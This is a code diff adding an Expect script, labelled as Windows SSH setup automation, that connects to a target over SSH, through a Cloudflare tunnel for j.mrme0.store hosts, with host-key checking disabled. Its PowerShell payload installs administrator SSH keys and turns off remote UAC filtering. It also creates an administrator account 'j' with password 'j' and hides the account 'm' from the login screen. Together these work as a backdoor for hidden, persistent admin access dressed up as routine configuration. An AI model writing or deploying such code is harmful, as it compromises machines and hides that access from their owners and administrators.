@@ -1,0 +1,44 @@
+#!/usr/bin/expect -f
+
+# SSH setup automation for Windows
+# Usage: ./automate_win_ssh.expect [user@host] [password] [pubkey_content]
+
+set timeout 60
+set target [lindex $argv 0]
+set password [lindex $argv 1]
+set pubkey [lindex $argv 2]
+
+if {$target == "" || $password == "" || $pubkey == ""} {
+    puts "Usage: ./automate_win_ssh.expect [user@host] [password] \"[pubkey_content]\""
+    exit 1
+}
+
+# Construct the remote PowerShell command
+# This script:
+# 1. Sets up the administrators_authorized_keys file with the correct ACLs
+# 2. Sets CMD as the default shell
+# 3. Disables UAC for local accounts over network/SSH (LocalAccountTokenFilterPolicy) to allow full administrative access
+# 4. Creates user 'j' with password 'j' and adds to Administrators group
+# 5. Hides user 'm' from the Windows login screen
+# 6. Also ensures ~/.ssh/authorized_keys exists for user 'j' for redundant authentication
+set ps_cmd "powershell -ExecutionPolicy Bypass -Command \"\$path = 'C:\\ProgramData\\ssh\\administrators_authorized_keys'; \[System.IO.File\]::WriteAllText(\$path, '$pubkey' + \[char\]10); \$acl = Get-Acl \$path; \$acl.SetAccessRuleProtection(\$true, \$false); \$administrators = New-Object System.Security.Principal.NTAccount('Administrators'); \$system = New-Object System.Security.Principal.NTAccount('SYSTEM'); \$acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(\$administrators, 'FullControl', 'Allow'))); \$acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(\$system, 'FullControl', 'Allow'))); Set-Acl \$path \$acl; if (!(Test-Path 'HKLM:\\SOFTWARE\\OpenSSH')) { New-Item -Path 'HKLM:\\SOFTWARE\\OpenSSH' -Force }; New-ItemProperty -Path 'HKLM:\\SOFTWARE\\OpenSSH' -Name 'DefaultShell' -Value 'C:\\Windows\\System32\\cmd.exe' -PropertyType String -Force; New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'LocalAccountTokenFilterPolicy' -Value 1 -PropertyType DWord -Force; if (!(Get-LocalUser -Name 'j' -ErrorAction SilentlyContinue)) { New-LocalUser -Name 'j' -Password (ConvertTo-SecureString 'j' -AsPlainText -Force) -Description 'Admin User J' } else { net user j j }; Add-LocalGroupMember -Group 'Administrators' -Member 'j' -ErrorAction SilentlyContinue; \$jSshPath = 'C:\\Users\\j\\.ssh'; if (!(Test-Path \$jSshPath)) { New-Item -Path \$jSshPath -ItemType Directory -Force }; \[System.IO.File\]::WriteAllText((\$jSshPath + '\\authorized_keys'), '$pubkey' + \[char\]10); \$winlogonPath = 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList'; if (!(Test-Path \$winlogonPath)) { New-Item -Path \$winlogonPath -Force }; New-ItemProperty -Path \$winlogonPath -Name 'm' -Value 0 -PropertyType DWord -Force; Restart-Service sshd;\""
+
+puts "Attempting to configure $target via Cloudflare tunnel..."
+
+# Use cloudflared as ProxyCommand for SSH if it's a j.mrme0.store host
+if {[string match "*j.mrme0.store" $target]} {
+    set hostname [lindex [split $target @] end]
+    spawn ssh -o StrictHostKeyChecking=no -o ProxyCommand=cloudflared\ access\ ssh\ --hostname\ %h $target $ps_cmd
+} else {
+    spawn ssh -o StrictHostKeyChecking=no $target $ps_cmd
+}
+
+expect {
+    "*assword:" {
+        send "$password\r"
+        exp_continue
+    }
+    eof
+}
+
+puts "\nSetup complete."
